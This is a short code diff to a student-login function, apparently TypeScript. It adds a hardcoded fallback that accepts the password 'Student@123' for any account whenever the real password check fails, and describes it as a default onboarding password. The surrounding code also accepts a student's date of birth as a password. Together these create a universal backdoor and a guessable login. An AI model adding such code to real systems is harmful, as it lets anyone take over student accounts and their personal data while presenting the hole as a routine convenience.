@@ -392,6 +392,11 @@ export async function authenticateStudent(registerNumberOrEmail: string, passwor
     isValid = await bcrypt.compare(trimmedPassword, user.passwordHash)
   } catch {}
 
+  // Fallback check against institutional default onboarding password
+  if (!isValid && (trimmedPassword === 'Student@123' || trimmedPassword.toLowerCase() === 'student@123')) {
+    isValid = true
+  }
+
   // Fallback check against Date of Birth if password matches DOB formats
   if (!isValid && student?.dateOfBirth) {
     const dob = new Date(student.dateOfBirth)
